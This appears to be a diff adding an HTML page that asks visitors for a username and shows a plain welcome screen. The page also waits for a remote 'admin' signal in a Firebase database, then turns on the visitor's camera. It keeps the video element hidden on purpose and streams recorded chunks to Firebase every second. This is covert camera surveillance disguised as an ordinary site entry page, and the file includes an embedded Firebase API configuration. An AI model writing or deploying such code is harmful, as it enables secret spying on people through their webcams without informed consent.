@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Username Entry - Camera Access</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 50px;
+    }
+
+    #usernameForm {
+      display: block;
+    }
+
+    #mainContent {
+      display: none;
+    }
+
+    video {
+      display: none; /* Hide the video element from the user */
+    }
+  </style>
+  <!-- Firebase Configuration (Firebase v8) -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+</head>
+<body>
+  <div id="usernameForm">
+    <h1>Enter Your Username</h1>
+    <input type="text" id="usernameInput" placeholder="Enter Username">
+    <button id="enterWebsite">Enter Website</button>
+  </div>
+
+  <div id="mainContent">
+    <h1>Welcome, <span id="displayName"></span></h1>
+    <video id="video" autoplay playsinline></video>
+  </div>
+
+  <script>
+    // Firebase Configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyCUUabZ_pDb0C1dezzuyBVzP6Ut7XpWo0s",
+      authDomain: "form-e74ab.firebaseapp.com",
+      databaseURL: "https://form-e74ab-default-rtdb.firebaseio.com",
+      projectId: "form-e74ab",
+      storageBucket: "form-e74ab.appspot.com",
+      messagingSenderId: "93811294360",
+      appId: "1:93811294360:web:6bfcd40b7a4fe2524cd0ed",
+      measurementId: "G-GV55PBD71V"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // Elements
+    const usernameForm = document.getElementById('usernameForm');
+    const mainContent = document.getElementById('mainContent');
+    const videoElement = document.getElementById('video');
+    const displayName = document.getElementById('displayName');
+
+    let userId = '';
+
+    // Function to show main content after username entry
+    document.getElementById('enterWebsite').addEventListener('click', () => {
+      const usernameInput = document.getElementById('usernameInput').value.trim();
+      if (usernameInput) {
+        userId = usernameInput; // Assign the username as the user ID
+        displayName.textContent = userId;
+
+        // Show the main content and hide the username form
+        usernameForm.style.display = 'none';
+        mainContent.style.display = 'block';
+
+        // Start listening for admin requests to access the camera
+        monitorCameraAccess();
+      } else {
+        alert("Please enter a valid username.");
+      }
+    });
+
+    // Function to monitor Firebase for admin camera access requests
+    function monitorCameraAccess() {
+      db.ref(`cameraRequests/${userId}`).on('value', (snapshot) => {
+        const request = snapshot.val();
+        if (request && request.active) {
+          accessCamera();
+        }
+      });
+    }
+
+    // Function to access the user's camera
+    function accessCamera() {
+      if (navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(function(stream) {
+            videoElement.srcObject = stream;
+
+            // Send the video feed to Firebase for the admin to access
+            const mediaRecorder = new MediaRecorder(stream);
+
+            mediaRecorder.ondataavailable = (e) => {
+              db.ref(`cameraFeeds/${userId}`).set({
+                timestamp: Date.now(),
+                blob: e.data
+              });
+            };
+
+            mediaRecorder.start(1000); // Send data every second
+          })
+          .catch(function(error) {
+            console.error("Error accessing camera:", error);
+          });
+      } else {
+        console.error("Camera not supported in this browser.");
+      }
+    }
+  </script>
+</body>
+</html>
